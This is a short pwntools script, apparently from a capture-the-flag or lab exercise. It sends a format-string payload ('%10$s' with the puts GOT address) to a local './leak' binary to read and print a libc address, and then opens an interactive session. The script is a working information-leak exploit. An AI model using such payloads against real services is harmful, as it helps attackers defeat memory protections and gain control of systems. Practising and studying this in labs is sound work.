from pwn import *

io = process("./leak")
elf = ELF("./leak")
#gdb.attach(io, 'b main')
#pause()
#context.log_level = 'debug'
payload = p32(elf.got["puts"]) + '%10$s'


io.sendlineafter('!',payload)
io.recvuntil('%10$s\n')
print hex(u32(io.recv(4)))
io.recv()
io.interactive()